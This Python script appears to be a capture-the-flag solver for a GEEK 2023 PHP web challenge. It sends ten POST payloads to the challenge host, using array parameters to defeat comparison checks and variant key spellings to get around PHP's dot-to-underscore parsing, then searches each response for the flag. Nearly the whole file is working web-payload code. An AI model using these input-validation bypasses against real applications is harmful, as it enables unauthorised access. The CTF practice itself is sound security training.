import urllib.request, urllib.parse, re, html as _html

url = 'http://80-2005f10e-b861-4aa9-8f0c-bc279804f290.challenge.ctfplus.cn'

def try_post(body_bytes, label):
    """Send raw POST body with exact bytes"""
    full_url = url + '?syc=Welcome+to+GEEK+2023%21%0a&lover=2022e1'
    req = urllib.request.Request(full_url, data=body_bytes, headers={
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    })
    resp = urllib.request.urlopen(req, timeout=10)
    body = _html.unescape(re.sub(r'<[^>]+>', '', resp.read().decode('utf-8', errors='replace')))
    idx = body.find('?>')
    text = body[idx+2:].strip() if idx > 0 else ''
    # Check result
    for pat in ['flag{', 'CTF{', 'ISCC{', 'Geesec{', 'GEEK{']:
        if pat in text:
            i = text.find(pat)
            e = text.find('}', i)
            if e > i:
                print(f"FLAG: {text[i:e+1]} ({label})")
                return
    short = text.replace('\xa0',' ')[:80]
    print(f"[{label}] -> {short}")

# Approach 1: standard (dot gets converted to underscore)
try_post(b'qw[]=a&yxx[]=b&SYC_GEEK.2023=xxx', 'std dot')

# Approach 2: escaped dot %2e
try_post(b'qw[]=a&yxx[]=b&SYC_GEEK%2e2023=xxx', 'pct dot')

# Approach 3: bracket notation SYC_GEEK[2023]
try_post(b'qw[]=a&yxx[]=b&SYC_GEEK[2023]=xxx', 'bracket')

# Approach 4: bracket with dot prefix
try_post(b'qw[]=a&yxx[]=b&SYC_GEEK[.2023]=xxx', 'bracket dot')

# Approach 5: both underscore AND dot keys
try_post(b'qw[]=a&yxx[]=b&SYC_GEEK_2023=xxx&SYC_GEEK.2023=yyy', 'both keys')

# Approach 6: space instead of dot
try_post(b'qw[]=a&yxx[]=b&SYC_GEEK%202023=xxx', 'space')

# Approach 7: just the key name with no value
try_post(b'qw[]=a&yxx[]=b&SYC_GEEK.2023', 'key only')

# Approach 8: raw post with multipart boundary
import email.mime.multipart, email.mime.text
# Too complex, skip

# Approach 9: PHP uses $_REQUEST which merges GET+POST+COOKIE
# If we put SYC_GEEK.2023 in GET params too
try_post(b'qw[]=a&yxx[]=b', 'GET override')
# Actually this doesn't set $_POST

# Approach 10: Try multiple values for the same key
try_post(b'qw[]=a&yxx[]=b&SYC_GEEK.2023=1&SYC_GEEK.2023=2', 'multi')
